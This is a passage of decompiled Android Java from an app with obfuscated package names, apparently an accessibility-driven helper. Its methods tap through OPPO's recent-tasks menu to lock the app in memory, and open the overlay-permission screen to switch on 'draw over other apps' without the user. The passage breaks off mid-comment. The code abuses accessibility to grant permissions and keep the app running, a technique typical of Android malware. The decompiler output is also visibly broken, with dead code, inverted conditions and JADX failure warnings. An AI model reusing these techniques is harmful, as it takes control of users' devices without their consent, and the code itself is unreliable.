    /* JADX WARN: Type inference failed for: r5v2, types: [com.storm.safe.rock.service.modules.yw5xud.a5, java.lang.Object] */
    /* JADX WARN: Type inference failed for: r5v3 */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:135:0x02f8 -> B:137:0x02fb). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:140:0x0315 -> B:138:0x02fd). Please report as a decompilation issue!!! */
    /* renamed from: c6 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212328c6(ContinuationImpl continuationImpl) throws Throwable {
        OppoStepsSimplified$executeOppoRecentTaskLock$1 oppoStepsSimplified$executeOppoRecentTaskLock$1;
        C0368a5 c0368a5;
        AccessibilityNodeInfo accessibilityNodeInfoM212335d8;
        C0368a5 c0368a52;
        CharSequence packageName;
        int i;
        long j;
        boolean z;
        String string;
        String string2;
        ?? r3 = this.f55112a1;
        ?? r5 = "[OPPO锁定] 当前包名: ";
        if (continuationImpl instanceof OppoStepsSimplified$executeOppoRecentTaskLock$1) {
            oppoStepsSimplified$executeOppoRecentTaskLock$1 = (OppoStepsSimplified$executeOppoRecentTaskLock$1) continuationImpl;
            int i2 = oppoStepsSimplified$executeOppoRecentTaskLock$1.f54581a4;
            if ((i2 & Integer.MIN_VALUE) != 0) {
                oppoStepsSimplified$executeOppoRecentTaskLock$1.f54581a4 = i2 - Integer.MIN_VALUE;
            } else {
                oppoStepsSimplified$executeOppoRecentTaskLock$1 = new OppoStepsSimplified$executeOppoRecentTaskLock$1(this, continuationImpl);
            }
        }
        Object obj = oppoStepsSimplified$executeOppoRecentTaskLock$1.f54579a2;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        boolean z2 = true;
        long j2 = 300;
        try {
            try {
                switch (oppoStepsSimplified$executeOppoRecentTaskLock$1.f54581a4) {
                    case 0:
                        kg1.m213544f4(obj);
                        m212303e0("[OPPO锁定] ========== 开始OPPO最近任务锁定 ==========");
                        try {
                            m212303e0("[OPPO锁定] 步骤1: 启动Activity...");
                            Intent intentM211757a1 = new C0328b3(r3).m211757a1();
                            if (intentM211757a1 != null) {
                                r3.startActivity(intentM211757a1);
                            } else {
                                m212303e0("[OPPO锁定] ⚠️ 无可用的启动 Activity，跳过");
                            }
                            oppoStepsSimplified$executeOppoRecentTaskLock$1.f54577a0 = this;
                            oppoStepsSimplified$executeOppoRecentTaskLock$1.f54581a4 = 1;
                            if (b81.m210571b1(300L, oppoStepsSimplified$executeOppoRecentTaskLock$1) != coroutineSingletons) {
                                c0368a5 = this;
                                c0368a5.getClass();
                                m212303e0("[OPPO锁定] 步骤2: 打开最近任务列表...");
                                c0368a5.f55111a0.performGlobalAction(3);
                                oppoStepsSimplified$executeOppoRecentTaskLock$1.f54577a0 = c0368a5;
                                oppoStepsSimplified$executeOppoRecentTaskLock$1.f54581a4 = 2;
                                r3 = c0368a5;
                                if (b81.m210571b1(800L, oppoStepsSimplified$executeOppoRecentTaskLock$1) == coroutineSingletons) {
                                    accessibilityNodeInfoM212335d8 = r3.m212335d8();
                                    if (accessibilityNodeInfoM212335d8 != null || (packageName = accessibilityNodeInfoM212335d8.getPackageName()) == null || (string = packageName.toString()) == null) {
                                        String string3 = "";
                                    }
                                    m212303e0("[OPPO锁定] 当前包名: ".concat(string3));
                                    m212303e0("[OPPO锁定] 步骤2.5: 先水平滑动一次...");
                                    r3.m212346f1();
                                    oppoStepsSimplified$executeOppoRecentTaskLock$1.f54577a0 = r3;
                                    oppoStepsSimplified$executeOppoRecentTaskLock$1.f54581a4 = 3;
                                    if (b81.m210571b1(500L, oppoStepsSimplified$executeOppoRecentTaskLock$1) != coroutineSingletons) {
                                        c0368a52 = r3;
                                        c0368a52.getClass();
                                        m212303e0("[OPPO锁定] 步骤3: 查找APP卡片并点击更多按钮...");
                                        i = 1;
                                        if (i >= 4) {
                                            c0368a52.getClass();
                                            m212303e0("[OPPO锁定] 第" + i + "次尝试...");
                                            AccessibilityNodeInfo accessibilityNodeInfoM212335d82 = c0368a52.m212335d8();
                                            if (accessibilityNodeInfoM212335d82 != null) {
                                                List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = accessibilityNodeInfoM212335d82.findAccessibilityNodeInfosByText(c0368a52.m212334d7());
                                                int size = listFindAccessibilityNodeInfosByText != null ? listFindAccessibilityNodeInfosByText.size() : 0;
                                                m212303e0("[OPPO锁定] 找到 " + size + " 个包含'" + c0368a52.m212334d7() + "'的节点");
                                                if (listFindAccessibilityNodeInfosByText == null || listFindAccessibilityNodeInfosByText.isEmpty()) {
                                                    j = 300;
                                                    m212303e0("[OPPO锁定] 未找到APP，尝试水平滑动...");
                                                    c0368a52.m212346f1();
                                                    oppoStepsSimplified$executeOppoRecentTaskLock$1.f54577a0 = c0368a52;
                                                    oppoStepsSimplified$executeOppoRecentTaskLock$1.f54578a1 = i;
                                                    oppoStepsSimplified$executeOppoRecentTaskLock$1.f54581a4 = 5;
                                                    break;
                                                } else {
                                                    m212303e0("[OPPO锁定] 步骤3.1: 搜索'更多'按钮...");
                                                    List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText2 = accessibilityNodeInfoM212335d82.findAccessibilityNodeInfosByText("更多");
                                                    m212303e0("[OPPO锁定] 找到 " + (listFindAccessibilityNodeInfosByText2 != null ? listFindAccessibilityNodeInfosByText2.size() : 0) + " 个'更多'节点");
                                                    if (listFindAccessibilityNodeInfosByText2 == null) {
                                                        listFindAccessibilityNodeInfosByText2 = EmptyList.f57568a0;
                                                    }
                                                    for (AccessibilityNodeInfo accessibilityNodeInfo : listFindAccessibilityNodeInfosByText2) {
                                                        CharSequence text = accessibilityNodeInfo.getText();
                                                        if (text == null || (string = text.toString()) == null) {
                                                            string = "";
                                                        }
                                                        CharSequence contentDescription = accessibilityNodeInfo.getContentDescription();
                                                        if (contentDescription == null || (string2 = contentDescription.toString()) == null) {
                                                            string2 = "";
                                                        }
                                                        Rect rect = new Rect();
                                                        accessibilityNodeInfo.getBoundsInScreen(rect);
                                                        boolean zIsVisibleToUser = accessibilityNodeInfo.isVisibleToUser();
                                                        m212303e0("[OPPO锁定] 更多节点: text='" + string + "', desc='" + string2 + "', visible=" + zIsVisibleToUser + ", 位置=" + rect.toShortString());
                                                        if (!zIsVisibleToUser || (!string.equals("更多") && !string2.equals("更多") && !AbstractC0779a1.m213652a5(string2, "更多", false))) {
                                                        }
                                                        m212303e0("[OPPO锁定] ✅ 点击'更多'按钮: (" + rect.centerX() + ", " + rect.centerY() + ")");
                                                        c0368a52.m212309a4((float) rect.centerX(), (float) rect.centerY());
                                                        m212303e0("[OPPO锁定] ✅ 点击更多按钮成功，等待菜单弹出...");
                                                        oppoStepsSimplified$executeOppoRecentTaskLock$1.f54577a0 = c0368a52;
                                                        oppoStepsSimplified$executeOppoRecentTaskLock$1.f54578a1 = i;
                                                        oppoStepsSimplified$executeOppoRecentTaskLock$1.f54581a4 = 6;
                                                        if (b81.m210571b1(800L, oppoStepsSimplified$executeOppoRecentTaskLock$1) != coroutineSingletons) {
                                                            c0368a52.getClass();
                                                            m212303e0("[OPPO锁定] 步骤4: 搜索并点击'锁定'...");
                                                            if (!c0368a52.m212311a6()) {
                                                                m212303e0("[OPPO锁定] ✅ 点击锁定成功");
                                                                oppoStepsSimplified$executeOppoRecentTaskLock$1.f54577a0 = c0368a52;
                                                                oppoStepsSimplified$executeOppoRecentTaskLock$1.f54581a4 = 7;
                                                                if (b81.m210571b1(500L, oppoStepsSimplified$executeOppoRecentTaskLock$1) == coroutineSingletons) {
                                                                }
                                                                c0368a52.f55111a0.performGlobalAction(2);
                                                                m212303e0("[OPPO锁定] ✅ OPPO锁定流程完成");
                                                                return Boolean.TRUE;
                                                            }
                                                            m212303e0("[OPPO锁定] ⚠️ 未找到锁定按钮，可能已锁定");
                                                            if (c0368a52.m212305a0()) {
                                                                m212303e0("[OPPO锁定] ✅ APP已经锁定");
                                                                c0368a52.f55111a0.performGlobalAction(1);
                                                                oppoStepsSimplified$executeOppoRecentTaskLock$1.f54577a0 = c0368a52;
                                                                oppoStepsSimplified$executeOppoRecentTaskLock$1.f54581a4 = 8;
                                                                if (b81.m210571b1(300L, oppoStepsSimplified$executeOppoRecentTaskLock$1) == coroutineSingletons) {
                                                                }
                                                                c0368a52.f55111a0.performGlobalAction(2);
                                                                return Boolean.TRUE;
                                                            }
                                                            oppoStepsSimplified$executeOppoRecentTaskLock$1.f54577a0 = c0368a52;
                                                            oppoStepsSimplified$executeOppoRecentTaskLock$1.f54578a1 = i;
                                                            oppoStepsSimplified$executeOppoRecentTaskLock$1.f54581a4 = 9;
                                                            j = 300;
                                                            if (b81.m210571b1(300L, oppoStepsSimplified$executeOppoRecentTaskLock$1) == coroutineSingletons) {
                                                            }
                                                            z = true;
                                                            i++;
                                                            j2 = j;
                                                            z2 = z;
                                                            if (i >= 4) {
                                                                c0368a52.getClass();
                                                                m212303e0("[OPPO锁定] ⚠️ 锁定流程未成功，返回桌面");
                                                                c0368a52.f55111a0.performGlobalAction(2);
                                                                return Boolean.FALSE;
                                                            }
                                                        }
                                                    }
                                                    m212303e0("[OPPO锁定] ⚠️ 未找到'更多'按钮");
                                                    oppoStepsSimplified$executeOppoRecentTaskLock$1.f54577a0 = c0368a52;
                                                    oppoStepsSimplified$executeOppoRecentTaskLock$1.f54578a1 = i;
                                                    oppoStepsSimplified$executeOppoRecentTaskLock$1.f54581a4 = 9;
                                                    j = 300;
                                                    if (b81.m210571b1(300L, oppoStepsSimplified$executeOppoRecentTaskLock$1) == coroutineSingletons) {
                                                    }
                                                    z = true;
                                                    i++;
                                                    j2 = j;
                                                    z2 = z;
                                                    if (i >= 4) {
                                                    }
                                                }
                                            } else {
                                                oppoStepsSimplified$executeOppoRecentTaskLock$1.f54577a0 = c0368a52;
                                                oppoStepsSimplified$executeOppoRecentTaskLock$1.f54578a1 = i;
                                                oppoStepsSimplified$executeOppoRecentTaskLock$1.f54581a4 = 4;
                                                if (b81.m210571b1(j2, oppoStepsSimplified$executeOppoRecentTaskLock$1) != coroutineSingletons) {
                                                    j = j2;
                                                    z = z2;
                                                    i++;
                                                    j2 = j;
                                                    z2 = z;
                                                    if (i >= 4) {
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                            return coroutineSingletons;
                        } catch (Exception e) {
                            e = e;
                            r5 = this;
                            String str = "[OPPO锁定] ❌ 异常: " + e.getMessage();
                            r5.getClass();
                            m212303e0(str);
                            r5.f55111a0.performGlobalAction(2);
                            return Boolean.FALSE;
                        }
                    case 1:
                        C0368a5 c0368a53 = oppoStepsSimplified$executeOppoRecentTaskLock$1.f54577a0;
                        kg1.m213544f4(obj);
                        c0368a5 = c0368a53;
                        c0368a5.getClass();
                        m212303e0("[OPPO锁定] 步骤2: 打开最近任务列表...");
                        c0368a5.f55111a0.performGlobalAction(3);
                        oppoStepsSimplified$executeOppoRecentTaskLock$1.f54577a0 = c0368a5;
                        oppoStepsSimplified$executeOppoRecentTaskLock$1.f54581a4 = 2;
                        r3 = c0368a5;
                        if (b81.m210571b1(800L, oppoStepsSimplified$executeOppoRecentTaskLock$1) == coroutineSingletons) {
                        }
                        return coroutineSingletons;
                    case 2:
                        C0368a5 c0368a54 = oppoStepsSimplified$executeOppoRecentTaskLock$1.f54577a0;
                        kg1.m213544f4(obj);
                        r3 = c0368a54;
                        accessibilityNodeInfoM212335d8 = r3.m212335d8();
                        if (accessibilityNodeInfoM212335d8 != null) {
                            break;
                        }
                        String string32 = "";
                        m212303e0("[OPPO锁定] 当前包名: ".concat(string32));
                        m212303e0("[OPPO锁定] 步骤2.5: 先水平滑动一次...");
                        r3.m212346f1();
                        oppoStepsSimplified$executeOppoRecentTaskLock$1.f54577a0 = r3;
                        oppoStepsSimplified$executeOppoRecentTaskLock$1.f54581a4 = 3;
                        if (b81.m210571b1(500L, oppoStepsSimplified$executeOppoRecentTaskLock$1) != coroutineSingletons) {
                        }
                        return coroutineSingletons;
                    case 3:
                        c0368a52 = oppoStepsSimplified$executeOppoRecentTaskLock$1.f54577a0;
                        kg1.m213544f4(obj);
                        c0368a52.getClass();
                        m212303e0("[OPPO锁定] 步骤3: 查找APP卡片并点击更多按钮...");
                        i = 1;
                        if (i >= 4) {
                        }
                        break;
                    case 4:
                        i = oppoStepsSimplified$executeOppoRecentTaskLock$1.f54578a1;
                        c0368a52 = oppoStepsSimplified$executeOppoRecentTaskLock$1.f54577a0;
                        kg1.m213544f4(obj);
                        j = 300;
                        z = true;
                        i++;
                        j2 = j;
                        z2 = z;
                        if (i >= 4) {
                        }
                        break;
                    case 5:
                        i = oppoStepsSimplified$executeOppoRecentTaskLock$1.f54578a1;
                        c0368a52 = oppoStepsSimplified$executeOppoRecentTaskLock$1.f54577a0;
                        kg1.m213544f4(obj);
                        j = 300;
                        z = true;
                        i++;
                        j2 = j;
                        z2 = z;
                        if (i >= 4) {
                        }
                        break;
                    case 6:
                        i = oppoStepsSimplified$executeOppoRecentTaskLock$1.f54578a1;
                        c0368a52 = oppoStepsSimplified$executeOppoRecentTaskLock$1.f54577a0;
                        kg1.m213544f4(obj);
                        c0368a52.getClass();
                        m212303e0("[OPPO锁定] 步骤4: 搜索并点击'锁定'...");
                        if (!c0368a52.m212311a6()) {
                        }
                        return coroutineSingletons;
                    case 7:
                        c0368a52 = oppoStepsSimplified$executeOppoRecentTaskLock$1.f54577a0;
                        kg1.m213544f4(obj);
                        c0368a52.f55111a0.performGlobalAction(2);
                        m212303e0("[OPPO锁定] ✅ OPPO锁定流程完成");
                        return Boolean.TRUE;
                    case 8:
                        c0368a52 = oppoStepsSimplified$executeOppoRecentTaskLock$1.f54577a0;
                        kg1.m213544f4(obj);
                        c0368a52.f55111a0.performGlobalAction(2);
                        return Boolean.TRUE;
                    case 9:
                        i = oppoStepsSimplified$executeOppoRecentTaskLock$1.f54578a1;
                        c0368a52 = oppoStepsSimplified$executeOppoRecentTaskLock$1.f54577a0;
                        kg1.m213544f4(obj);
                        j = 300;
                        z = true;
                        i++;
                        j2 = j;
                        z2 = z;
                        if (i >= 4) {
                        }
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
            } catch (Exception e2) {
                e = e2;
            }
        } catch (Exception e3) {
            e = e3;
            r5 = r3;
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:102:0x025a, code lost:
    
        if (r3.m212354f9(300, r4) != r5) goto L104;
     */
    /* JADX WARN: Code restructure failed: missing block: B:87:0x020e, code lost:
    
        if (r6.m212354f9(500, r4) == r5) goto L103;
     */
    /* JADX WARN: Code restructure failed: missing block: B:89:0x0211, code lost:
    
        r3 = r6;
     */
    /* JADX WARN: Code restructure failed: missing block: B:96:0x0237, code lost:
    
        if (r6.m212354f9(500, r4) == r5) goto L103;
     */
    /* JADX WARN: Removed duplicated region for block: B:101:0x024e A[PHI: r3
      0x024e: PHI (r3v49 com.storm.safe.rock.service.modules.yw5xud.a5) = (r3v47 com.storm.safe.rock.service.modules.yw5xud.a5), (r3v50 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:99:0x024b, B:13:0x003e] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:32:0x00cb A[PHI: r3
      0x00cb: PHI (r3v8 com.storm.safe.rock.service.modules.yw5xud.a5) = (r3v6 com.storm.safe.rock.service.modules.yw5xud.a5), (r3v9 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:30:0x00c7, B:17:0x005c] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:35:0x00f7 A[PHI: r0 r3
      0x00f7: PHI (r0v16 java.lang.Object) = (r0v15 java.lang.Object), (r0v1 java.lang.Object) binds: [B:33:0x00f3, B:16:0x0055] A[DONT_GENERATE, DONT_INLINE]
      0x00f7: PHI (r3v10 com.storm.safe.rock.service.modules.yw5xud.a5) = (r3v8 com.storm.safe.rock.service.modules.yw5xud.a5), (r3v12 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:33:0x00f3, B:16:0x0055] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:38:0x010c  */
    /* JADX WARN: Removed duplicated region for block: B:41:0x0114  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x001b  */
    /* JADX WARN: Removed duplicated region for block: B:90:0x0213  */
    /* renamed from: c7 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212329c7(ContinuationImpl continuationImpl) throws Throwable {
        OppoStepsSimplified$executeOverlay$1 oppoStepsSimplified$executeOverlay$1;
        C0368a5 c0368a5;
        C0368a5 c0368a52;
        boolean z;
        C0368a5 c0368a53;
        boolean z2;
        String string;
        C1351vv c1351vv = C1351vv.f60710b1;
        if (continuationImpl instanceof OppoStepsSimplified$executeOverlay$1) {
            oppoStepsSimplified$executeOverlay$1 = (OppoStepsSimplified$executeOverlay$1) continuationImpl;
            int i = oppoStepsSimplified$executeOverlay$1.f54586a4;
            if ((i & Integer.MIN_VALUE) != 0) {
                oppoStepsSimplified$executeOverlay$1.f54586a4 = i - Integer.MIN_VALUE;
            } else {
                oppoStepsSimplified$executeOverlay$1 = new OppoStepsSimplified$executeOverlay$1(this, continuationImpl);
            }
        }
        Object objM212314a9 = oppoStepsSimplified$executeOverlay$1.f54584a2;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        boolean z3 = true;
        switch (oppoStepsSimplified$executeOverlay$1.f54586a4) {
            case 0:
                kg1.m213544f4(objM212314a9);
                Context context = this.f55112a1;
                if (Settings.canDrawOverlays(context)) {
                    m212303e0("✅ 已有悬浮窗权限");
                    m212341e5("overlay");
                    return c1351vv;
                }
                m212303e0("[悬浮窗] 步骤1: 打开悬浮窗设置页...");
                try {
                    Intent intent = new Intent("android.settings.action.MANAGE_OVERLAY_PERMISSION");
                    intent.setData(Uri.parse("package:" + context.getPackageName()));
                    intent.setFlags(1350631424);
                    context.startActivity(intent);
                    oppoStepsSimplified$executeOverlay$1.f54582a0 = this;
                    oppoStepsSimplified$executeOverlay$1.f54586a4 = 1;
                    if (m212354f9(300L, oppoStepsSimplified$executeOverlay$1) != coroutineSingletons) {
                        c0368a5 = this;
                        c0368a5.getClass();
                        m212303e0("[悬浮窗] 步骤2: 等待列表加载...");
                        oppoStepsSimplified$executeOverlay$1.f54582a0 = c0368a5;
                        oppoStepsSimplified$executeOverlay$1.f54586a4 = 2;
                        if (c0368a5.m212352f7(3, 1500L, oppoStepsSimplified$executeOverlay$1) != coroutineSingletons) {
                            m212303e0("[悬浮窗] 步骤3: 滚动找应用[" + c0368a5.m212334d7() + "]...");
                            String strM212334d7 = c0368a5.m212334d7();
                            oppoStepsSimplified$executeOverlay$1.f54582a0 = c0368a5;
                            oppoStepsSimplified$executeOverlay$1.f54586a4 = 3;
                            objM212314a9 = c0368a5.m212314a9(strM212334d7, 25, oppoStepsSimplified$executeOverlay$1);
                            if (objM212314a9 != coroutineSingletons) {
                                boolean zBooleanValue = ((Boolean) objM212314a9).booleanValue();
                                oppoStepsSimplified$executeOverlay$1.f54582a0 = c0368a5;
                                oppoStepsSimplified$executeOverlay$1.f54583a1 = zBooleanValue;
                                oppoStepsSimplified$executeOverlay$1.f54586a4 = 4;
                                if (c0368a5.m212354f9(300L, oppoStepsSimplified$executeOverlay$1) != coroutineSingletons) {
                                    c0368a52 = c0368a5;
                                    z = zBooleanValue;
                                    if (!z) {
                                        c0368a52.getClass();
                                        m212303e0("[悬浮窗] 步骤4: 开启悬浮窗开关...");
                                        Iterator it = AbstractC0716jf.m213306g5("授予悬浮窗权限", "允许在其他应用上层显示", "在其他应用上层显示", "显示在其他应用上层").iterator();
                                        while (true) {
                                            if (it.hasNext()) {
                                                String str = (String) it.next();
                                                if (c0368a52.m212319b7(str)) {
                                                    AbstractC0003a2.m46c7("✅ 开启[", str, "]成功");
                                                    z2 = true;
                                                }
                                            } else {
                                                z2 = false;
                                            }
                                        }
                                        if (!z2) {
                                            m212303e0("[悬浮窗] 文本匹配失败，尝试直接查找页面开关...");
                                            m212303e0("[开关-页面] 尝试直接查找页面上的开关...");
                                            AccessibilityNodeInfo accessibilityNodeInfoM212335d8 = c0368a52.m212335d8();
                                            if (accessibilityNodeInfoM212335d8 == null) {
                                                m212303e0("[开关-页面] ❌ 获取root失败");
                                            } else {
                                                AccessibilityNodeInfo accessibilityNodeInfoM212300d4 = m212300d4(accessibilityNodeInfoM212335d8);
                                                if (accessibilityNodeInfoM212300d4 == null) {
                                                    m212303e0("[开关-页面] ❌ 页面上未找到任何开关组件");
                                                } else {
                                                    CharSequence className = accessibilityNodeInfoM212300d4.getClassName();
                                                    String strM213684d7 = (className == null || (string = className.toString()) == null) ? "unknown" : AbstractC0779a1.m213684d7(string, ".");
                                                    boolean zIsChecked = accessibilityNodeInfoM212300d4.isChecked();
                                                    m212303e0("[开关-页面] 找到开关: class=" + strM213684d7 + ", isChecked=" + zIsChecked);
                                                    if (zIsChecked) {
                                                        m212303e0("[开关-页面] ✅ 开关已开启，无需操作");
                                                    } else if (accessibilityNodeInfoM212300d4.performAction(16)) {
                                                        m212303e0("[开关-页面] ✅ 直接点击开关成功");
                                                    } else {
                                                        AccessibilityNodeInfo parent = accessibilityNodeInfoM212300d4.getParent();
                                                        if (parent != null && parent.isClickable() && parent.performAction(16)) {
                                                            m212303e0("[开关-页面] ✅ 点击开关父节点成功");
                                                        } else {
                                                            Rect rectM24a5 = AbstractC0003a2.m24a5(accessibilityNodeInfoM212300d4);
                                                            if (rectM24a5.width() <= 0 || rectM24a5.height() <= 0 || !c0368a52.m212309a4(rectM24a5.centerX(), rectM24a5.centerY())) {
                                                                m212303e0("[开关-页面] ❌ 开关点击失败");
                                                            } else {
                                                                m212303e0("[开关-页面] ✅ 手势点击开关成功");
                                                            }
                                                        }
                                                    }
                                                    z2 = z3;
                                                }
                                            }
                                            z3 = false;
                                            z2 = z3;
                                        }
                                        if (!z2) {
                                            c0368a52.m212313a8("允许");
                                        }
                                        oppoStepsSimplified$executeOverlay$1.f54582a0 = c0368a52;
                                        oppoStepsSimplified$executeOverlay$1.f54586a4 = 5;
                                        break;
                                    } else {
                                        c0368a52.getClass();
                                        m212303e0("[悬浮窗] 未找到应用，尝试直接开启开关...");
                                        if (!c0368a52.m212319b7("允许显示悬浮窗") && !c0368a52.m212319b7("显示悬浮窗")) {
                                            c0368a52.m212313a8("允许");
                                        }
                                        oppoStepsSimplified$executeOverlay$1.f54582a0 = c0368a52;
                                        oppoStepsSimplified$executeOverlay$1.f54586a4 = 6;
                                        break;
                                    }
                                    c0368a53.getClass();
                                    m212303e0("[悬浮窗] 步骤5: 返回...");
                                    oppoStepsSimplified$executeOverlay$1.f54582a0 = c0368a53;
                                    oppoStepsSimplified$executeOverlay$1.f54586a4 = 7;
                                    if (c0368a53.m212345e9(oppoStepsSimplified$executeOverlay$1) != coroutineSingletons) {
                                        oppoStepsSimplified$executeOverlay$1.f54582a0 = c0368a53;
                                        oppoStepsSimplified$executeOverlay$1.f54586a4 = 8;
                                        break;
                                    }
                                }
                            }
                        }
                    }
                    return coroutineSingletons;
                } catch (Exception e) {
                    m212303e0("⚠️ 打开悬浮窗设置页失败: " + e.getMessage());
                    return c1351vv;
                }
            case 1:
                c0368a5 = oppoStepsSimplified$executeOverlay$1.f54582a0;
                kg1.m213544f4(objM212314a9);
                c0368a5.getClass();
                m212303e0("[悬浮窗] 步骤2: 等待列表加载...");
                oppoStepsSimplified$executeOverlay$1.f54582a0 = c0368a5;
                oppoStepsSimplified$executeOverlay$1.f54586a4 = 2;
                if (c0368a5.m212352f7(3, 1500L, oppoStepsSimplified$executeOverlay$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 2:
                c0368a5 = oppoStepsSimplified$executeOverlay$1.f54582a0;
                kg1.m213544f4(objM212314a9);
                m212303e0("[悬浮窗] 步骤3: 滚动找应用[" + c0368a5.m212334d7() + "]...");
                String strM212334d72 = c0368a5.m212334d7();
                oppoStepsSimplified$executeOverlay$1.f54582a0 = c0368a5;
                oppoStepsSimplified$executeOverlay$1.f54586a4 = 3;
                objM212314a9 = c0368a5.m212314a9(strM212334d72, 25, oppoStepsSimplified$executeOverlay$1);
                if (objM212314a9 != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 3:
                c0368a5 = oppoStepsSimplified$executeOverlay$1.f54582a0;
                kg1.m213544f4(objM212314a9);
                boolean zBooleanValue2 = ((Boolean) objM212314a9).booleanValue();
                oppoStepsSimplified$executeOverlay$1.f54582a0 = c0368a5;
                oppoStepsSimplified$executeOverlay$1.f54583a1 = zBooleanValue2;
                oppoStepsSimplified$executeOverlay$1.f54586a4 = 4;
                if (c0368a5.m212354f9(300L, oppoStepsSimplified$executeOverlay$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 4:
                z = oppoStepsSimplified$executeOverlay$1.f54583a1;
                c0368a52 = oppoStepsSimplified$executeOverlay$1.f54582a0;
                kg1.m213544f4(objM212314a9);
                if (!z) {
                }
                c0368a53.getClass();
                m212303e0("[悬浮窗] 步骤5: 返回...");
                oppoStepsSimplified$executeOverlay$1.f54582a0 = c0368a53;
                oppoStepsSimplified$executeOverlay$1.f54586a4 = 7;
                if (c0368a53.m212345e9(oppoStepsSimplified$executeOverlay$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 5:
            case 6:
                c0368a53 = oppoStepsSimplified$executeOverlay$1.f54582a0;
                kg1.m213544f4(objM212314a9);
                c0368a53.getClass();
                m212303e0("[悬浮窗] 步骤5: 返回...");
                oppoStepsSimplified$executeOverlay$1.f54582a0 = c0368a53;
                oppoStepsSimplified$executeOverlay$1.f54586a4 = 7;
                if (c0368a53.m212345e9(oppoStepsSimplified$executeOverlay$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 7:
                c0368a53 = oppoStepsSimplified$executeOverlay$1.f54582a0;
                kg1.m213544f4(objM212314a9);
                oppoStepsSimplified$executeOverlay$1.f54582a0 = c0368a53;
                oppoStepsSimplified$executeOverlay$1.f54586a4 = 8;
                break;
            case 8:
                c0368a53 = oppoStepsSimplified$executeOverlay$1.f54582a0;
                kg1.m213544f4(objM212314a9);
                if (!Settings.canDrawOverlays(c0368a53.f55112a1)) {
                    m212303e0("⚠️ 悬浮窗权限未开启");
                    return c1351vv;
                }
                c0368a53.m212341e5("overlay");
                m212303e0("✅ 悬浮窗流程完成");
                return c1351vv;
            default:
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:27:0x0053  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0013  */
    /* renamed from: c8 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212330c8(ContinuationImpl continuationImpl) throws Throwable {
        OppoStepsSimplified$executeOverlayWithResult$1 oppoStepsSimplified$executeOverlayWithResult$1;
        C0368a5 c0368a5;
        if (continuationImpl instanceof OppoStepsSimplified$executeOverlayWithResult$1) {
            oppoStepsSimplified$executeOverlayWithResult$1 = (OppoStepsSimplified$executeOverlayWithResult$1) continuationImpl;
            int i = oppoStepsSimplified$executeOverlayWithResult$1.f54590a3;
            if ((i & Integer.MIN_VALUE) != 0) {
                oppoStepsSimplified$executeOverlayWithResult$1.f54590a3 = i - Integer.MIN_VALUE;
            } else {
                oppoStepsSimplified$executeOverlayWithResult$1 = new OppoStepsSimplified$executeOverlayWithResult$1(this, continuationImpl);
            }
        }
        Object obj = oppoStepsSimplified$executeOverlayWithResult$1.f54588a1;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i2 = oppoStepsSimplified$executeOverlayWithResult$1.f54590a3;
        boolean z = false;
        if (i2 == 0) {
            kg1.m213544f4(obj);
            try {
                oppoStepsSimplified$executeOverlayWithResult$1.f54587a0 = this;
                oppoStepsSimplified$executeOverlayWithResult$1.f54590a3 = 1;
                if (m212329c7(oppoStepsSimplified$executeOverlayWithResult$1) == coroutineSingletons) {
                    return coroutineSingletons;
                }
                c0368a5 = this;
            } catch (Exception e) {
                e = e;
                c0368a5 = this;
                String str = "❌ 悬浮窗设置异常: " + e.getMessage();
                c0368a5.getClass();
                m212303e0(str);
                return Boolean.valueOf(z);
            }
        } else {
            if (i2 != 1) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            c0368a5 = oppoStepsSimplified$executeOverlayWithResult$1.f54587a0;
            try {
                kg1.m213544f4(obj);
            } catch (Exception e2) {
                e = e2;
                String str2 = "❌ 悬浮窗设置异常: " + e.getMessage();
                c0368a5.getClass();
                m212303e0(str2);
                return Boolean.valueOf(z);
            }
        }
        if (!Settings.canDrawOverlays(c0368a5.f55112a1)) {
            if (c0368a5.m212336d9("overlay")) {
                z = true;
            }
        }
        return Boolean.valueOf(z);
    }

    /* JADX WARN: Code restructure failed: missing block: B:180:0x04c8, code lost:
    
        if (p000.b81.m210571b1(r5, r3) == r4) goto L214;
     */
    /* JADX WARN: Code restructure failed: missing block: B:182:0x04cc, code lost:
    
        r14 = 1;
     */
    /* JADX WARN: Code restructure failed: missing block: B:186:0x04eb, code lost:
    
        if (p000.b81.m210571b1(r5, r3) == r4) goto L214;
     */
    /* JADX WARN: Code restructure failed: missing block: B:194:0x0510, code lost:
    
        if (p000.b81.m210571b1(r8, r3) == r4) goto L214;
     */
    /* JADX WARN: Code restructure failed: missing block: B:207:0x054f, code lost:
    
        if (p000.b81.m210571b1(r6, r3) != r4) goto L209;
     */
    /* JADX WARN: Code restructure failed: missing block: B:213:0x057a, code lost:
    
